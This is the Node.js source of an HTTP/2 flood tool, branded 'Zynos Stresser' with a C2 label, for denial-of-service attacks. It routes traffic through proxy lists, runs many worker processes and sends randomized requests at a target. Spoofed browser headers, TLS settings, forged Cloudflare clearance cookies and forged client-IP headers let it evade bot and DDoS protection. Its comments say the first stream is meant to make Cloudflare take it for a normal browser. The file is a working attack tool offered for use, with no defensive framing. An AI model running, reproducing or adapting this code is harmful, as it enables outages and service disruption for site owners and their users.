const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");

const blue = '\x1b[34m';
const white = '\x1b[37m';
const reset = '\x1b[0m';

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const accept_header = [
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
];

const encoding_header = [
  'gzip, deflate, br',
  'gzip, deflate',
  'br'
];

const cache_header = [
  'no-cache, no-store, private, must-revalidate',
  'max-age=0, no-cache, no-store',
  'no-store, max-age=0'
];

const refers = [
  "https://www.google.com/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://twitter.com/"
];

const uap = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
];

const language_header = [
  "en-US,en;q=0.9,id;q=0.8",
  "id-ID,id;q=0.9,en;q=0.8",
  "en-GB,en;q=0.9"
];

const sec_ch_ua = [
  '"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Google Chrome";v="132", "Chromium";v="132", "Not_A Brand";v="24"'
];

const sec_ch_ua_platform = [
  '"Windows"',
  '"macOS"',
  '"Linux"'
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
  "ecdsa_secp256r1_sha256",
  "rsa_pss_rsae_sha256",
  "rsa_pkcs1_sha256",
  "ecdsa_secp384r1_sha384",
  "rsa_pss_rsae_sha384",
  "rsa_pkcs1_sha384"
];

const cplist = [
  "TLS_AES_128_GCM_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_CHACHA20_POLY1305_SHA256"
];

let SignalsList = sigalgs.join(':');
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_TLSv1_3 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;

if (process.argv.length < 7) {
    console.log(`Usage: host time req thread proxy.txt`);
    process.exit();
}

const secureProtocol = "TLS_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.clear();
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[33mUser: \x1b[32mPrv\x1b[0m \x1b[36m|\x1b[0m \x1b[33mVip: \x1b[32mtrue\x1b[0m \x1b[36m|\x1b[0m \x1b[33mSuperVip: \x1b[32mtrue\x1b[0m`);
    console.log(`\x1b[33mAdmin: \x1b[35mZYNOS\x1b[0m \x1b[36m|\x1b[0m \x1b[33mExpired: \x1b[31mNo\x1b[0m \x1b[36m|\x1b[0m \x1b[33mTime Limit: \x1b[32m${args.time}s\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[33mTarget: \x1b[37m${args.target}\x1b[0m`);
    console.log(`\x1b[33mRate: \x1b[37m${args.Rate}/s\x1b[0m \x1b[36m|\x1b[0m \x1b[33mThreads: \x1b[37m${args.threads}\x1b[0m`);
    console.log(`\x1b[33mProxy: \x1b[37m${args.proxyFile} (\x1b[32m${proxies.length}\x1b[37m)\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[35mZynos Stresser 2025-2026 | C2 | t.me/zynos_official\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1);
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (response.includes("HTTP/1.1 200")) {
                return callback(connection, undefined);
            } else {
                connection.destroy();
                return callback(undefined, "error: invalid response");
            }
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout");
        });

        connection.on("error", () => {
            connection.destroy();
            return callback(undefined, "error: connection error");
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() && !line.startsWith('#'));
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedProxy[1] || "443";
    
    const val = {
        'NEL': JSON.stringify({
            "report_to": "cf-nel",
            "max_age": 604800,
            "include_subdomains": true
        })
    };
    
    // ===== BYPASS HEADER =====
    const bypassHeaders = [
        { "X-Forwarded-For": parsedProxy[0] },
        { "cf-connecting-ip": parsedProxy[0] },
        { "X-Real-IP": parsedProxy[0] },
        { "origin": "https://" + parsedTarget.host },
        { "referer": "https://" + parsedTarget.host + "/" },
        { "cookie": "cf_clearance=" + randstr(8) + "." + randstr(24) + "." + randstr(48) + "-0.0.1; __cf_bm=" + randstr(44) + "." + randstr(24) + "-" + Date.now() + "-0-0.0.1" },
        { "sec-ch-ua": sec_ch_ua[Math.floor(Math.random() * sec_ch_ua.length)] },
        { "sec-ch-ua-mobile": "?0" },
        { "sec-ch-ua-platform": sec_ch_ua_platform[Math.floor(Math.random() * sec_ch_ua_platform.length)] },
        { "sec-fetch-user": "?1" },
        { "upgrade-insecure-requests": "1" },
        { "dnt": "1" },
        { "x-requested-with": "XMLHttpRequest" },
        { "X-Originating-IP": parsedProxy[0] },
        { "X-Remote-IP": parsedProxy[0] },
        { "X-Client-IP": parsedProxy[0] }
    ];

    let ZynosHeaders = {
      ":authority": parsedTarget.host,
      ":scheme": "https",
      ":path": (parsedTarget.path || "/") + "?" + randstr(6) + "=" + generateRandomString(20, 30) + "&" + randstr(4) + "=" + generateRandomString(15, 25),
      ":method": "GET",
      "NEL": val,
      "pragma": "no-cache",
      "upgrade-insecure-requests": "1",
      "accept": accept_header[Math.floor(Math.random() * accept_header.length)],
      "accept-encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
      "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
      "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
      "referer": refers[Math.floor(Math.random() * refers.length)],
      "sec-fetch-mode": "navigate",
      "sec-fetch-site": "same-origin",
      "sec-fetch-dest": "document",
      "user-agent": uap[Math.floor(Math.random() * uap.length)]
    };
    
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host,
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error || !connection) return;

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const tlsOptions = {
            socket: connection,
            ALPNProtocols: ["h2"],
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            ciphers: cplist[Math.floor(Math.random() * cplist.length)],
            secureContext: tls.createSecureContext({
                ciphers: ciphers,
                sigalgs: SignalsList,
                honorCipherOrder: true,
                secureOptions: secureOptions,
                secureProtocol: secureProtocol
            })
        };

        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions, () => {
            if (tlsSocket.alpnProtocol !== 'h2') {
                tlsSocket.destroy();
                connection.destroy();
                return;
            }

            tlsSocket.setKeepAlive(true, 60000);
            tlsSocket.setNoDelay(true);

            const client = http2.connect(parsedTarget.href, {
                createConnection: () => tlsSocket,
                settings: {
                    headerTableSize: 65536,
                    maxHeaderListSize: 32768,
                    initialWindowSize: 15564991,
                    maxFrameSize: 16384,
                    enablePush: false
                }
            });

            client.on("connect", () => {
                const interval = setInterval(() => {
                    // ===== KIRIM 1 STREAM DULU BIAR CF KIRA BROWSER NORMAL =====
                    const dynamicPath = (parsedTarget.path || "/") + "?" + randstr(8) + "=" + generateRandomString(18, 28);
                    const dynamicHeaders = {
                        ...ZynosHeaders,
                        ":path": dynamicPath,
                        ...bypassHeaders[Math.floor(Math.random() * bypassHeaders.length)]
                    };

                    try {
                        const req = client.request(dynamicHeaders, {
                            parent: 0,
                            exclusive: true,
                            weight: 220
                        });

                        req.on('response', () => {
                            req.close();
                            req.destroy();
                        });

                        req.on('error', () => {
                            req.destroy();
                        });

                        req.end();
                    } catch (err) { }

                    // ===== KIRIM SISA STREAM DENGAN DELAY RENDAH =====
                    for (let i = 1; i < args.Rate; i++) {
                        setTimeout(() => {
                            const path2 = (parsedTarget.path || "/") + "?" + randstr(6) + "=" + generateRandomString(15, 25);
                            const headers2 = {
                                ...ZynosHeaders,
                                ":path": path2,
                                ...bypassHeaders[Math.floor(Math.random() * bypassHeaders.length)]
                            };
                            try {
                                const req2 = client.request(headers2, {
                                    parent: 0,
                                    exclusive: true,
                                    weight: 200
                                });
                                req2.on('response', () => { req2.close(); req2.destroy(); });
                                req2.on('error', () => { req2.destroy(); });
                                req2.end();
                            } catch (err) { }
                        }, i * 10); // delay 10ms antar stream
                    }
                }, 1000);

                client.on('close', () => clearInterval(interval));
            });

            client.on("error", () => {
                client.destroy();
                tlsSocket.destroy();
                connection.destroy();
            });

            client.on("close", () => {
                tlsSocket.destroy();
                connection.destroy();
            });
        });

        tlsSocket.on("error", () => {
            tlsSocket.destroy();
            connection.destroy();
        });
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', () => { });
process.on('unhandledRejection', () => { });